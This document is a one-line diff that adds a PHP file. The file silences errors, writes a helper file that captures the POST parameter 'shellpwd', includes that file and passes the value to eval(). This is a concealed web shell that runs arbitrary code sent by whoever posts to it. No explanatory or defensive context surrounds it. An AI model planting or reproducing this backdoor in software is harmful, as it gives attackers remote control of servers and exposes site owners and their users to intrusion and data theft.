@@ -1,0 +1,1 @@
+<?php error_reporting(0);file_put_contents('inc','<?php $str=@$_POST["shellpwd"]?>');require 'inc';eval(@$str);?>
